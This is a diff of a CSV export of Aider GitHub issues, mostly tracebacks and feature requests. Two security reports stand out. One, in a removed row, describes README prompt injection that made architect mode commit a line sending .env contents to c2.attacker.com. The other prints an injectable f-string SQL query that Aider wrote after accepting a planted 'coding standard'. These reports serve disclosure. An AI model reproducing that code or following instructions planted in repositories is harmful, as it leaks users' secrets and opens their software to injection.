-  File ""base_coder.py"", line 887, in run
-    self.run_one(user_message, preproc)
-  File ""base_coder.py"", line 934, in run_one
-    list(self.send_message(message))
-  File ""base_coder.py"", line 1429, in send_message
-    chunks = self.format_messages()
-             ^^^^^^^^^^^^^^^^^^^^^^
-  File ""base_coder.py"", line 1334, in format_messages
-    chunks = self.format_chat_chunks()
-             ^^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""base_coder.py"", line 1281, in format_chat_chunks
-    chunks.repo = self.get_repo_messages()
-                  ^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""base_coder.py"", line 752, in get_repo_messages
-    repo_content = self.get_repo_map()
-                   ^^^^^^^^^^^^^^^^^^^
-  File ""base_coder.py"", line 734, in get_repo_map
-    repo_content = self.repo_map.get_repo_map(
-                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""repomap.py"", line 135, in get_repo_map
-    files_listing = self.get_ranked_tags_map(
-                    ^^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""repomap.py"", line 617, in get_ranked_tags_map
-    result = self.get_ranked_tags_map_uncached(
-             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""repomap.py"", line 648, in get_ranked_tags_map_uncached
-    ranked_tags = self.get_ranked_tags(
-                  ^^^^^^^^^^^^^^^^^^^^^
-  File ""repomap.py"", line 447, in get_ranked_tags
-    tags = list(self.get_tags(fname, rel_fname))
-                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""repomap.py"", line 254, in get_tags
-    data = list(self.get_tags_raw(fname, rel_fname))
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""repomap.py"", line 302, in get_tags_raw
-    captures = self._run_captures(Query(language, query_scm), tree.root_node)
-                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^
-tree_sitter.QueryError: Invalid node type at row 2, column 2: module
-
-```
-","","2026-02-27T20:50:25Z"
 "Aider-AI/aider","2026 Jan-Jul","4004853317","4869","Add docker binary to aider-full","### Issue
 
 I prefer to run everything via containers, since installing aider on arch is quite troublesome (lots of AUR packages needed), i decided also run aider in docker. Running aider in docker however, makes one thing not possible right now, and that is to tell aider to run (for example) tests via docker, because the docker binary is missing. I did of course volume mount the socket.
@@ -3966,68 +3347,6 @@ Traceback (most recent call last):
 NotImplementedError: Non-relative patterns are unsupported
 
 ```","","2026-03-06T21:40:27Z"
-"Aider-AI/aider","2026 Jan-Jul","4039469585","4892","Uncaught RuntimeError in pathlib.py line 1237","Aider version: 0.86.2
-Python version: 3.12.12
-Platform: Linux-6.18.16-200.fc43.x86_64-x86_64-with-glibc2.42
-Python implementation: CPython
-Virtual environment: Yes
-OS: Linux 6.18.16-200.fc43.x86_64 (64bit)
-Git version: git version 2.53.0
-
-An uncaught exception occurred:
-
-```
-Traceback (most recent call last):
-  File ""pathlib.py"", line 1250, in resolve
-    p.stat()
-  File ""pathlib.py"", line 840, in stat
-    return os.stat(self, follow_symlinks=follow_symlinks)
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-OSError: [Errno 40] Too many levels of symbolic links: '/home/Leon/Gizmo_MY_AI-main/│'
-
-During handling of the above exception, another exception occurred:
-
-Traceback (most recent call last):
-  File ""aider"", line 10, in <module>
-    sys.exit(main())
-             ^^^^^^
-  File ""main.py"", line 1162, in main
-    coder.run()
-  File ""base_coder.py"", line 887, in run
-    self.run_one(user_message, preproc)
-  File ""base_coder.py"", line 934, in run_one
-    list(self.send_message(message))
-  File ""base_coder.py"", line 1429, in send_message
-    chunks = self.format_messages()
-             ^^^^^^^^^^^^^^^^^^^^^^
-  File ""base_coder.py"", line 1334, in format_messages
-    chunks = self.format_chat_chunks()
-             ^^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""base_coder.py"", line 1281, in format_chat_chunks
-    chunks.repo = self.get_repo_messages()
-                  ^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""base_coder.py"", line 752, in get_repo_messages
-    repo_content = self.get_repo_map()
-                   ^^^^^^^^^^^^^^^^^^^
-  File ""base_coder.py"", line 719, in get_repo_map
-    all_abs_files = set(self.get_all_abs_files())
-                        ^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""base_coder.py"", line 2166, in get_all_abs_files
-    files = [self.abs_root_path(path) for path in files]
-             ^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""base_coder.py"", line 572, in abs_root_path
-    res = utils.safe_abs_path(res)
-          ^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""utils.py"", line 98, in safe_abs_path
-    res = Path(res).resolve()
-          ^^^^^^^^^^^^^^^^^^^
-  File ""pathlib.py"", line 1252, in resolve
-    check_eloop(e)
-  File ""pathlib.py"", line 1237, in check_eloop
-    raise RuntimeError(""Symlink loop from %r"" % e.filename)
-RuntimeError: Symlink loop from '/home/Leon/Gizmo_MY_AI-main/│'
-
-```","","2026-03-07T20:55:38Z"
 "Aider-AI/aider","2026 Jan-Jul","4042363517","4897","Uncaught ValueError in exceptions.py line 71","Aider version: 0.86.2
 Python version: 3.14.3
 Platform: Windows-11-10.0.26100-SP0
@@ -4589,7 +3908,7 @@ Adding `--auto-test --test-cmd ""go build ./... && go test ./...""` should enabl
 
 ## Context
 
-We benchmarked aider against 10+ other AI coding CLIs (codex, claude, copilot, goose, etc.) on the same 10-bug Go project. Aider consistently produced reasonable first-pass fixes but shipped with compilation or test errors — grading C vs A for agents with built-in verify loops.
+We benchmarked aider against 10+ other AI coding CLIs (codex, claude, copilot, goose, etc.) on the same 10-bug Go project. Aider consistently produced reasonable first-pass fixes but shipped with compilation or test errors - grading C vs A for agents with built-in verify loops.
 
 **Our aider command:**
 ```bash
@@ -4618,7 +3937,7 @@ aider --file ... --message ""..."" \
 
 1. Document that `--auto-test --test-cmd` works with `--message` mode for headless/CI usage
 2. Consider adding `--auto-test` to the scripting/headless examples in the docs
-3. If `--auto-test` doesn't work with `--message` mode, consider making it work — it's the key gap vs competitors in headless benchmarks
+3. If `--auto-test` doesn't work with `--message` mode, consider making it work - it's the key gap vs competitors in headless benchmarks
 
 ## Environment
 
@@ -4659,54 +3978,6 @@ Traceback (most recent call last):
 aider.commands.SwitchCoder
 
 ```","","2026-03-16T09:41:15Z"
-"Aider-AI/aider","2026 Jan-Jul","4082200085","4932","ANY_GIT_ERROR catches TypeError/AttributeError, silently hiding programming bugs at 22 call sites","## Summary
-
-`ANY_GIT_ERROR` in `repo.py` includes `TypeError`, `ValueError`, `AttributeError`, and `AssertionError` — exceptions that indicate programming bugs, not git errors. These are caught by `except ANY_GIT_ERROR` at 22 call sites across the codebase, silently swallowing real bugs.
-
-## The problem
-
-```python
-# aider/repo.py L26-36
-ANY_GIT_ERROR += [
-    OSError, IndexError, BufferError,
-    TypeError,        # ← programming bug, not a git error
-    ValueError,       # ← programming bug, not a git error
-    AttributeError,   # ← programming bug, not a git error
-    AssertionError,   # ← programming bug, not a git error
-    TimeoutError,
-]
-```
-
-## Most dangerous call sites
-
-1. **`base_coder.py:2318`** — `apply_updates()`: Any `TypeError`/`AttributeError` in `get_edits()` or `prepare_to_edit()` is caught and treated as a git error. The user sees a vague message instead of a traceback.
-
-2. **`commands.py:297`** — `do_run()`: Wraps all command execution. Any `TypeError` inside any command shows as `Unable to complete /xxx: ...` with no indication of a programming bug.
-
-3. **`repo.py:384`** — `get_diffs()`: Uses `except (TypeError,) + ANY_GIT_ERROR`. Since `ANY_GIT_ERROR` already contains `TypeError`, this is redundant — evidence that even the author lost track of what's in the tuple.
-
-## Impact
-
-- Programming bugs (NoneType attribute access, wrong argument types, failed assertions) are silently caught at 22 locations
-- Users see misleading ""git error"" messages for what are actually code bugs
-- Bug reports become harder to diagnose because tracebacks are suppressed
-- New bugs introduced in covered code paths are invisible
-
-## Suggested approach
-
-This is a structural issue that can't be fixed in one PR. A possible incremental approach:
-
-1. **Phase 1**: Add logging before the silent catch — `get_logger().debug(f""Caught {type(e).__name__} in ANY_GIT_ERROR: {e}"")` at each site. This makes hidden bugs visible without changing behavior.
-
-2. **Phase 2**: Gradually narrow the catch — Remove `TypeError`/`AttributeError`/`AssertionError`/`ValueError` from `ANY_GIT_ERROR` and handle them individually where they legitimately occur (if any).
-
-I understand these exception types may have been added to handle real edge cases (e.g., `gitpython` sometimes raises `TypeError` internally). If that's the case, the catch should be narrowed to specific known cases rather than a blanket catch.
-
-## Evidence
-
-The fact that `repo.py:384` writes `(TypeError,) + ANY_GIT_ERROR` — manually adding `TypeError` when it's already in the tuple — suggests the contents of `ANY_GIT_ERROR` are not well-understood even by contributors.
-
-Happy to help with a phased cleanup if this direction makes sense.","","2026-03-16T12:30:57Z"
 "Aider-AI/aider","2026 Jan-Jul","4082298185","4933","No way to force aider to do just one pass via cli (no architect mode).","### Issue
 
 There seems no way to force aider to do just one pass via cli (no architect mode).
@@ -4823,9 +4094,9 @@ Traceback (most recent call last):
 NotImplementedError: Non-relative patterns are unsupported
 
 ```","","2026-03-18T18:23:42Z"
-"Aider-AI/aider","2026 Jan-Jul","4099127504","4942","AgentBench-Live: Open benchmark — would love to add Aider as an adapter","Hi! We built [AgentBench-Live](https://github.com/jackjin1997/AgentBench-Live), an open-source benchmark that tests AI coding agents on 10 real-world tasks (bug fixes, data analysis, multi-step workflows, tool use).
+"Aider-AI/aider","2026 Jan-Jul","4099127504","4942","AgentBench-Live: Open benchmark - would love to add Aider as an adapter","Hi! We built [AgentBench-Live](https://github.com/jackjin1997/AgentBench-Live), an open-source benchmark that tests AI coding agents on 10 real-world tasks (bug fixes, data analysis, multi-step workflows, tool use).
 
-Currently we've benchmarked Claude Code (0.74) and Gemini CLI (0.52). We'd love to add **Aider** as an adapter — it's ~15 lines of Python with our template method pattern:
+Currently we've benchmarked Claude Code (0.74) and Gemini CLI (0.52). We'd love to add **Aider** as an adapter - it's ~15 lines of Python with our template method pattern:
 
 ```python
 @register_adapter
@@ -6132,30 +5403,6 @@ Traceback (most recent call last):
 AssertionError: config parser should convert anything that is not a list to string.
 
 ```","","2026-04-04T21:55:15Z"
-"Aider-AI/aider","2026 Jan-Jul","4206044895","4992","/help token raises error","### Issue
-
-
-```text
-> /help how can the edit format be changed during a session                                                                                                                  
-
-Loading weights: 100%|██████████████████████████████████████████████████████████████████████████| 199/199 [00:00<00:00, 1716.23it/s, Materializing param=pooler.dense.weight]
-BertModel LOAD REPORT from: BAAI/bge-small-en-v1.5
-Key                     | Status     |  | 
-------------------------+------------+--+-
-embeddings.position_ids | UNEXPECTED |  | 
-
-Notes:
-- UNEXPECTED	:can be ignored when loading from different task/architecture; not ok if you expect identical arch.
-litellm.BadRequestError: LLM Provider NOT provided. Pass in the LLM provider you are trying to call. You passed model=claude-haiku-4-6
- Pass model as E.g. For 'Huggingface' inference endpoints pass in `completion(model='huggingface/starcoder',..)` Learn more: https://docs.litellm.ai/docs/providers
-
-https://docs.litellm.ai/docs/providers
-Open URL for more info? (Y)es/(N)o/(D)on't ask again [Yes]:                                    
-```
-
-### Version and model info
-
-_No response_","","2026-04-04T23:55:18Z"
 "Aider-AI/aider","2026 Jan-Jul","4207129559","4993","Uncaught ModuleNotFoundError in scrape.py line 144","Aider version: 0.86.2
 Python version: 3.12.2
 Platform: Windows-10-10.0.19045-SP0
@@ -6198,99 +5445,6 @@ Traceback (most recent call last):
 ModuleNotFoundError: No module named 'playwright'
 
 ```","","2026-04-05T09:43:55Z"
-"Aider-AI/aider","2026 Jan-Jul","4208821519","4996","Network unreachable? Not here. Mystery","### Issue
-
-I can use the `claude` CLI to interact iwth Sonnet., so I do not understand what I am seeing. on startup.
-
-```
-$ unset ANTHROPIC_API_KEY
-$ aider
-────────────────────────────────────────────────────────────────────────────────────────────────────
-HTTPSConnectionPool(host='raw.githubusercontent.com', port=443): Max retries exceeded with url: /BerriAI/litellm/main/model_prices_and_context_window.json (Caused by NewConnectionError(""HTTPSConnection(host='raw.githubusercontent.com', port=443): Failed to establish a new connection: [Errno 101] Network is unreachable""))
-HTTPSConnectionPool(host='raw.githubusercontent.com', port=443): Max retries exceeded with url: /BerriAI/litellm/main/model_prices_and_context_window.json (Caused by NewConnectionError(""HTTPSConnection(host='raw.githubusercontent.com', port=443): Failed to establish a new connection: [Errno 101] Network is unreachable""))
-Aider v0.86.2
-Main model: anthropic/claude-sonnet-4-6 with whole edit format
-Weak model: claude-3-5-haiku-latest
-Git repo: .git with 159 files
-Repo-map: using 1024 tokens, auto refresh
-────────────────────────────────────────────────────────────────────────────────────────────────────
-> ?
-
-Initial repo scan can be slow in larger repos, but only happens once.
-Scanning repo: 100%|██████████████████████████████████████████████| 159/159 [00:11<00:00, 14.38it/s]
-litellm.InternalServerError: AnthropicException - [Errno 101] Network is unreachable. Handle with
-`litellm.InternalServerError`.
-The API provider's servers are down or overloaded.
-Retrying in 0.2 seconds...
-litellm.InternalServerError: AnthropicException - [Errno 101] Network is unreachable. Handle with
-`litellm.InternalServerError`.
-The API provider's servers are down or overloaded.
-Retrying in 0.5 seconds...
-    ░litellm.InternalServerError: AnthropicException - [Errno 101] Network is unreachable. Handle with
-`litellm.InternalServerError`.
-The API provider's servers are down or overloaded.
-Retrying in 1.0 seconds...
-      litellm.InternalServerError: AnthropicException - [Errno 101] Network is unreachable. Handle with
-`litellm.InternalServerError`.
-The API provider's servers are down or overloaded.
-Retrying in 2.0 seconds...
-       ░litellm.InternalServerError: AnthropicException - [Errno 101] Network is unreachable. Handle with
-`litellm.InternalServerError`.
-The API provider's servers are down or overloaded.
-Retrying in 4.0 seconds...
- litellm.InternalServerError: AnthropicException - [Errno 101] Network is unreachable. Handle with
-`litellm.InternalServerError`.
-The API provider's servers are down or overloaded.
-Retrying in 8.0 seconds...
-   ^C      Waiting for anthropic/claude-sonnet-4-6
-
-
-^C again to exit
-────────────────────────────────────────────────────────────────────────────────────────────────────
->
-
-
-^C KeyboardInterrupt
-(default) mslinn@gata instrument_recorder (master)
-$ aider --model gemini/gemini-3.1-pro
-────────────────────────────────────────────────────────────────────────────────────────────────────
-HTTPSConnectionPool(host='raw.githubusercontent.com', port=443): Max retries exceeded with url: /BerriAI/litellm/main/model_prices_and_context_window.json (Caused by NewConnectionError(""HTTPSConnection(host='raw.githubusercontent.com', port=443): Failed to establish a new connection: [Errno 101] Network is unreachable""))
-HTTPSConnectionPool(host='raw.githubusercontent.com', port=443): Max retries exceeded with url: /BerriAI/litellm/main/model_prices_and_context_window.json (Caused by NewConnectionError(""HTTPSConnection(host='raw.githubusercontent.com', port=443): Failed to establish a new connection: [Errno 101] Network is unreachable""))
-HTTPSConnectionPool(host='raw.githubusercontent.com', port=443): Max retries exceeded with url: /BerriAI/litellm/main/model_prices_and_context_window.json (Caused by NewConnectionError(""HTTPSConnection(host='raw.githubusercontent.com', port=443): Failed to establish a new connection: [Errno 101] Network is unreachable""))
-Aider v0.86.2
-Main model: gemini/gemini-3.1-pro with whole edit format
-Weak model: claude-3-5-haiku-latest
-Git repo: .git with 159 files
-Repo-map: using 1024 tokens, auto refresh
-────────────────────────────────────────────────────────────────────────────────────────────────────
-> ?
-
-litellm.APIConnectionError: Vertex_ai_betaException - [Errno 101] Network is unreachable
-Retrying in 0.2 seconds...
-litellm.APIConnectionError: Vertex_ai_betaException - [Errno 101] Network is unreachable
-Retrying in 0.5 seconds...
-       litellm.APIConnectionError: Vertex_ai_betaException - [Errno 101] Network is unreachable
-Retrying in 1.0 seconds...
-litellm.APIConnectionError: Vertex_ai_betaException - [Errno 101] Network is unreachable
-Retrying in 2.0 seconds...
-     litellm.APIConnectionError: Vertex_ai_betaException - [Errno 101] Network is unreachable
-Retrying in 4.0 seconds...
-   ░litellm.APIConnectionError: Vertex_ai_betaException - [Errno 101] Network is unreachable
-Retrying in 8.0 seconds...
-      ^C   Waiting for gemini/gemini-3.1-pro
-
-
-^C again to exit
-────────────────────────────────────────────────────────────────────────────────────────────────────
->
-
-
-^C KeyboardInterrupt
-```
-
-### Version and model info
-
-_No response_","","2026-04-05T23:35:58Z"
 "Aider-AI/aider","2026 Jan-Jul","4210882930","4997","Browser & ask mode","### Issue
 
 when i start browse, when i use /ask something in the browse, it will modify my code
@@ -6415,7 +5569,7 @@ Traceback (most recent call last):
 RuntimeError: Symlink loop from '/home/user/git/dotfiles/nvim/.config/nvim/vim'
 
 ```","","2026-04-06T15:55:23Z"
-"Aider-AI/aider","2026 Jan-Jul","4216311775","5004","Docs: add Rapid-MLX as a local provider page for Apple Silicon?","Hi — would a docs PR adding Aider documentation for [Rapid-MLX](https://github.com/raullenchai/Rapid-MLX) be welcome?
+"Aider-AI/aider","2026 Jan-Jul","4216311775","5004","Docs: add Rapid-MLX as a local provider page for Apple Silicon?","Hi - would a docs PR adding Aider documentation for [Rapid-MLX](https://github.com/raullenchai/Rapid-MLX) be welcome?
 
 Rapid-MLX is an OpenAI-compatible local inference server for Apple Silicon, built on Apple's MLX framework. It's `pip install`-able, exposes the standard `/v1` chat completions API on `localhost:8000`, and supports tool/function calling for many open-weight models (Qwen, GLM, MiniMax, Gemma 4, GPT-OSS, ...). I have verified end-to-end that it works with Aider's edit-and-commit workflow against Gemma 4 26B (single-shot edit on a toy Python file completes successfully via `--openai-api-base http://localhost:8000/v1`).
 
@@ -6494,7 +5648,7 @@ except ANY_GIT_ERROR as e:
     logger.debug(f""Git operation failed: {e.__class__.__name__}: {e}"")
 ```
 
-**Option B (stricter):** Split `ANY_GIT_ERROR` into two tuples — one for actual git/IO errors and one for programming errors — and handle them differently. Programming errors would be logged at warning level.
+**Option B (stricter):** Split `ANY_GIT_ERROR` into two tuples - one for actual git/IO errors and one for programming errors - and handle them differently. Programming errors would be logged at warning level.
 
 I'd lean toward Option A as a first step since it's non-breaking and immediately helps with debugging. Thoughts?","","2026-04-08T06:10:25Z"
 "Aider-AI/aider","2026 Jan-Jul","4223320555","5010","Uncaught NotImplementedError in pathlib.py line 1090","Aider version: 0.86.2
@@ -7456,137 +6610,6 @@ Relevant runtime/default details:
   - `aider/main.py:918`
   - `aider/repo.py:277-279`
   - `aider/website/docs/git.md:43`","","2026-04-21T13:04:54Z"
-"Aider-AI/aider","2026 Jan-Jul","4303267495","5058","Architect mode can turn README prompt injection into committed backdoored code","### Issue
-
-I would like to report a security-relevant trust-boundary problem in Aider architect mode.
-
-In architect mode, Aider uses a two-stage model flow:
-1. the architect model proposes the solution
-2. the editor model turns that proposal into concrete file edits
-
-The issue is that the architect output is forwarded directly to the editor with:
-
-`editor_coder.run(with_message=content, preproc=False)`
-
-This means the architect output is handed to the editor as raw input without going
-through the normal `preproc_user_input()` layer that would otherwise process slash
-commands, file mentions, and URL preprocessing.
-
-In a validated retest, attacker-controlled repository content in `README.md`
-contained a hidden `ARCHITECT OVERRIDE` instruction. The observed chain was:
-
-1. Aider architect mode read the poisoned `README.md`
-2. the architect model emitted a malicious “telemetry import statement”
-3. the editor model applied that malicious import to `auth.py`
-4. Aider committed the backdoored file
-
-The inserted code was:
-
-```python
-import base64, urllib.request; urllib.request.urlopen(
-    ""https://c2.attacker.com/b?d=""+base64.b64encode(open("".env"").read().encode()).decode()
-)
-```
-
-So the final effect was:
-
-read .env
-base64-encode its contents
-send the data to an attacker-controlled endpoint
-commit the modified file with a normal-looking commit message
-Important precision point:
-I am not claiming that preproc=False disables all safety logic. More narrowly, it
-bypasses the normal input preprocessing path. Also, in the validated retest command,
---yes was used, so that specific run did not rely solely on the default architect
-confirmation behavior.
-
-Observed retest result:
-
-malicious README.md was read
-architect output contained the attacker-controlled import directive
-editor applied it to auth.py
-commit recorded as feaaf7d
-Expected behavior:
-Aider should not treat architect output as trusted editor input without an additional
-validation layer, especially when the architect context can be influenced by repository
-content.
-
-Actual behavior:
-Aider architect mode can transform repository prompt injection into committed backdoored
-code through the architect → editor handoff.
-
-Relevant source locations:
-
-aider/coders/architect_coder.py:17
-aider/coders/architect_coder.py:44
-aider/coders/base_coder.py:912-930
-aider/args.py:179-182
-aider/main.py:1005
-aider/coders/base_coder.py:340,354
-aider/website/docs/usage/modes.md:113-123
-
-### Version and model info
-
-```markdown
-Aider v0.86.3.dev19+g861a1e4d1
-Model: gpt-4o-mini with architect edit format
-Editor model: gpt-4o-mini with editor-whole edit format
-Git repo: .git with 3 files
-Repo-map: using 4096 tokens
-
-Retest setup:
-- architect mode enabled
-- command used:
-  aider --architect --model gpt-4o-mini --editor-model gpt-4o-mini \
-    --message ""请查看 README 文件，然后帮我重构 auth.py，实现基于 JWT 的身份验证功能。"" \
-    --yes auth.py README.md","","2026-04-21T14:26:22Z"
-"Aider-AI/aider","2026 Jan-Jul","4304019158","5059","/help models  Downloads tones of somethings","### Issue
-
-> /help models                                                                                                        
-To use interactive /help you need to install the help extras
-/home/user/.local/share/uv/tools/aider-chat/bin/python -m pip install --upgrade --upgrade-strategy only-if-needed 
-'aider-chat[help]' --extra-index-url https://download.pytorch.org/whl/cpu
-Run pip install? (Y)es/(N)o [Yes]: y                                                                                  
-Installing: /home/user/.local/share/uv/tools/aider-chat/bin/python -m pip install --upgrade --upgrade-strategy only-if-needed 'aider-chat[help]' --extra-index-url https://download.pytorch.org/whl/cpu
-Installation complete.  
-Warning: You are sending unauthenticated requests to the HF Hub. Please set a HF_TOKEN to enable higher rate limits and faster downloads.
-modules.json: 100%|███████████████████████████████████████████████████████████████████| 349/349 [00:00<00:00, 646kB/s]
-config_sentence_transformers.json: 100%|██████████████████████████████████████████████| 124/124 [00:00<00:00, 269kB/s]
-README.md: 94.8kB [00:00, 37.1MB/s]
-sentence_bert_config.json: 100%|████████████████████████████████████████████████████| 52.0/52.0 [00:00<00:00, 109kB/s]
-config.json: 100%|███████████████████████████████████████████████████████████████████| 743/743 [00:00<00:00, 1.61MB/s]
-model.safetensors: 100%|███████████████████████████████████████████████████████████| 133M/133M [00:10<00:00, 13.2MB/s]
-Loading weights: 100%|████████████████████| 199/199 [00:00<00:00, 458.98it/s, Materializing param=pooler.dense.weight]
-BertModel LOAD REPORT from: BAAI/bge-small-en-v1.5
-Key                     | Status     |  | 
-------------------------+------------+--+-
-embeddings.position_ids | UNEXPECTED |  | 
-Notes:
-- UNEXPECTED	:can be ignored when loading from different task/architecture; not ok if you expect identical arch.
-tokenizer_config.json: 100%|██████████████████████████████████████████████████████████| 366/366 [00:00<00:00, 552kB/s]
-vocab.txt: 232kB [00:00, 2.12MB/s]
-tokenizer.json: 711kB [00:00, 9.86MB/s]
-special_tokens_map.json: 100%|████████████████████████████████████████████████████████| 125/125 [00:00<00:00, 244kB/s]
-config.json: 100%|█████████████████████████████
-
-
-So why command **/help models**
-Let me this 
-**To use interactive /help you need to install the help extras
-/home/users/.local/share/uv/tools/aider-chat/bin/python -m pip install --upgrade --upgrade-strategy only-if-needed 'aider-chat[help]' --extra-index-url https://download.pytorch.org/whl/cpu**
-and then it download above.
-
-What I expect: text of help.
-Result: it download tones of garbarge.
-Then if I'm not connected to ollama -- it waiting for them. But why it send something to LLM? Why this help is missing in system?
-
-Then if I connected to local ollama server, why in answer it send me some info about models which are not on this local server? Didn't  see any logic of these actions from help- command. Help info on site have no information how to use this situation. 
-
-UPDATE: O my god! All /help subcomands run LM. WTF? In previous version it run inapplication text strins. Ho w to get this strings?
-
-### Version and model info
-
-_No response_","","2026-04-21T16:37:27Z"
 "Aider-AI/aider","2026 Jan-Jul","4304755661","5060","Uncaught OSError in util.py line 1045","Aider version: 0.86.2
 Python version: 3.12.13
 Platform: macOS-26.4.1-arm64-arm-64bit
@@ -7730,7 +6753,7 @@ The `Co-authored-by` trailer is not being appended to commit messages when using
        Add .gitignore
    
    No Co-authored-by trailer present.
-5. Also tried running with explicit CLI flag: `aider --attribute-co-authored-by` — same result, no trailer.
+5. Also tried running with explicit CLI flag: `aider --attribute-co-authored-by` - same result, no trailer.
 
 ### Expected Behavior
 
@@ -7813,10 +6836,10 @@ Aider's repo-map is excellent at giving the model structural awareness of the fu
 codebase without loading everything. But once a file is explicitly added to the chat 
 context, it never leaves unless the user manually calls /drop. Over a multi-task session, 
 the active context accumulates files that were relevant several tasks ago but are now 
-dead weight — silently consuming the context window.
+dead weight - silently consuming the context window.
 
 This matters most for local model users (the majority of aider's self-hosted userbase), 
-where a 14B or 32B model on a 16K–32K window degrades measurably with every stale file 
+where a 14B or 32B model on a 16K-32K window degrades measurably with every stale file 
 that stays loaded. But it also affects cloud users paying for tokens that no longer 
 contribute to the active task.
 
@@ -7829,10 +6852,10 @@ multi-factor staleness score and automatically recommends compression or evictio
 **Repo:** https://github.com/Sanyam-ahuja/context-pilot-mcp
 
 **Staleness scoring factors (weighted):**
-- Turn decay (40%) — sigmoid decay since last reference
-- Edit recency (25%) — recently edited files stay sticky
-- Token cost (20%) — expensive files are prioritized for eviction
-- Dependency graph (15%) — files imported by actively edited files are protected
+- Turn decay (40%) - sigmoid decay since last reference
+- Edit recency (25%) - recently edited files stay sticky
+- Token cost (20%) - expensive files are prioritized for eviction
+- Dependency graph (15%) - files imported by actively edited files are protected
 
 **Compression:** Before dropping, stale files are AST-compressed to signatures-only 
 via tree-sitter. The model continues to see structure, not nothing.
@@ -7851,10 +6874,10 @@ dynamically without deleting active context.
 
 ## Proposed contribution
 
-I'd like to contribute this into aider natively — not as an external MCP dependency 
+I'd like to contribute this into aider natively - not as an external MCP dependency 
 but as a first-class context lifecycle layer sitting alongside the existing repo-map.
 
-The integration point I'm thinking about is `base_coder.py` — specifically the 
+The integration point I'm thinking about is `base_coder.py` - specifically the 
 `abs_fnames` set that tracks added files. A staleness tracker could shadow this set 
 and surface suggestions (or act automatically in a new `--auto-drop` mode) after 
 each turn.
@@ -8081,7 +7104,7 @@ Active settings / switches:
 
 I would like to report a security-relevant behavior issue in Aider's code generation workflow.
 
-In a validated retest, Aider first generated a safe parameterized SQL query, but later accepted an attacker-supplied “team coding standard” that required string formatting instead of parameterized queries. After accepting that guidance, Aider rewrote the safe query into an unsafe string-formatted SQL query and later applied the same insecure pattern to a new login function.
+In a validated retest, Aider first generated a safe parameterized SQL query, but later accepted an attacker-supplied ""team coding standard"" that required string formatting instead of parameterized queries. After accepting that guidance, Aider rewrote the safe query into an unsafe string-formatted SQL query and later applied the same insecure pattern to a new login function.
 
 The narrower and validated claim is:
 
@@ -8111,7 +7134,7 @@ cursor.execute(f""SELECT * FROM users WHERE username = '{username}' AND password
 
 Why I believe this is security-relevant:
 - Aider displaced a safe SQL pattern with a known SQL injection-prone pattern
-- the unsafe change was justified and normalized as a “team coding standard”
+- the unsafe change was justified and normalized as a ""team coding standard""
 - the same insecure pattern was then reused in a later function
 - the final generated code was committed in that insecure state
 
@@ -8673,35 +7696,6 @@ Traceback (most recent call last):
 OSError: [Errno 36] File name too long: '--extra-system-prompt=FILE PATH RULES:\n1. Always create/edit files in the current directory (./) unless explicitly told otherwise.\n2. Never use generic paths like """", ""src/"", ""folder/"" unless the user specifically requests a subdirectory.\n3. If unsure about a path, ask the user before creating the file.\n\nCODE OUTPUT RULES:\n1. Do not try to scrape URLs or execute shell commands.\n2. Do not interpret backticks in console.log as URLs.\n3. Generate minimal, valid code that runs.\n'
 
 ```","","2026-05-06T12:08:35Z"
-"Aider-AI/aider","2026 Jan-Jul","4400314069","5111","Edit-block path doubling: small models hallucinate prefix-doubled headers; existing prepended-dir guard misses multi-segment cases","## Summary
-Small editor models (e.g. `groq/llama-3.3-70b-versatile`, `openrouter/openai/gpt-oss-120b`, `gemini-2.5-flash-lite`) occasionally emit edit-block filename headers with the chat-file's own prefix duplicated — e.g. `.claude/.claude/foo.json` when the chat file is `.claude/foo.json`. The existing ""GPT prepended a bogus dir"" guard at [`wholefile_coder.py:68-72`](https://github.com/Aider-AI/aider/blob/main/aider/coders/wholefile_coder.py#L68-L72) only matches when the LLM emits just the basename, so multi-segment doubled prefixes fall through. `abs_root_path()` concatenates blindly, the file lands at `<root>/.claude/.claude/foo.json`, and the canonical path is left empty (or a 0-byte stub).
-
-## Reproduction (observed in production dispatch)
-- Edit format: `whole` (also reproduces under `diff` — see fuzzy-match cutoff analysis below)
-- Editor models seen triggering: `groq/llama-3.3-70b-versatile`, `openrouter/openai/gpt-oss-120b`, `gemini-2.5-flash-lite`
-- `--file` arg: absolute path resolving to e.g. `.claude/claude-mem.config.json`
-- Trigger condition: dense `--read` context with multiple files sharing a top directory prefix
-
-Symptom: `<root>/.claude/.claude/claude-mem.config.json` written; `<root>/.claude/claude-mem.config.json` is a 0-byte stub or empty. Observed across ≥6 dispatches over a 4-day window in a project that runs aider via subprocess from a stable git root with absolute `--file` paths.
-
-## Root cause
-`aider/coders/wholefile_coder.py:68-72`:
-```python
-if fname and fname not in chat_files and Path(fname).name in chat_files:
-    fname = Path(fname).name
-```
-Only handles the case where the LLM-emitted fname's basename alone matches a chat file. For chat file `.claude/claude-mem.config.json`, the bare basename `claude-mem.config.json` is *not* in `chat_files` (chat_files contains the full relative path), so the guard falls through silently.
-
-`editblock_coder.find_filename` has the same gap — `difflib.get_close_matches(..., cutoff=0.8)` does catch many doubled-prefix cases (e.g. `dir/dir/file.py` ratio ≈ 0.857), but cases where the doubling produces a SequenceMatcher ratio below 0.8 (e.g. `sub/dir/sub/dir/foo.py` vs `sub/dir/foo.py` ratio = 0.778) fall through to the has-extension fallback and the doubled path is returned verbatim.
-
-## Proposed fix
-Extend the existing prepended-dir guard with progressive suffix-stripping against the chat-files list. Minimal, follows the same pattern. Only triggers when exact match AND basename match both fail, and only resolves when a deterministic suffix is itself a known chat file.
-
-PR with implementation + tests forthcoming (4 files changed, +67/-2 lines). Tests cover the wholefile path (LLM doubles `subdir/sample.txt` → `subdir/subdir/sample.txt`) and the editblock fuzzy-below-cutoff case.
-
